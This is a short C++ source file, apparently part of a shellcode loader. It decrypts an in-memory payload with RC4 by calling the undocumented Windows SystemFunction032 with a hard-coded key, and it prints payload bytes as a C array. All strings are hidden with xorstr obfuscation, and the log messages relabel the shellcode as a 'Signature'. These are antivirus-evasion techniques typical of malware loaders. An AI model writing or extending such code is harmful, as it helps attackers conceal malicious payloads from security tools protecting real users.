#include "Signatures.hpp"
#include "Console.hpp"

#include <iostream>




bool Shellcode::DecryptShellcode(__in PBYTE pPayloadData, __in std::size_t szPayload)
{
    NTSTATUS status = 1;
    auto encryptedKey = xorstr("OurEncryptionKey");

    CAppendedPrint(xorstr_("Decryptor"), xorstr_("Decrypting Signature..."))
   


    auto Key = USTRING{ 0 }; 
    auto Img = USTRING{ 0 };
 
    InitializeUString(&Key, encryptedKey.crypt_get(), encryptedKey.size());
    InitializeUString(&Img, pPayloadData, szPayload);
 

    auto pSystemFunction033 = (fnSystemFunction032)Sigs.systemFunction032Ptr;


    if (!NT_SUCCESS(status = pSystemFunction033(&Img, &Key)))
    { 
        CAppendedPrintErrorCode(xorstr_("Decryptor"), xorstr_("Failed To Decrypt Signature With Error"), U_PTR(status))
     
        return false;
    }

    CPrintBland(xorstr_("Successful"))

    return true;
}



void Shellcode::PrintHexData(__in const char* Name, __in PBYTE Data, __in std::size_t Size)
{

    std::cout << xorstr_("unsigned char ") << Name << xorstr_("[] = {");

    for (int i = 0; i < Size; i++)
    {

        if (i % 16 == 0)
        {
            std::cout << "\n\t";
        }
        if (i < Size - 1)
        {
            std::cout << xorstr_("0x") << std::uppercase << std::hex << (std::uint32_t)Data[i] << ", ";
        }
        else
        {
            std::cout << xorstr_("0x") << std::uppercase << std::hex << (std::uint32_t)Data[i] << " ";
        }
    }

    std::cout << xorstr_("};\n\n\n");
}
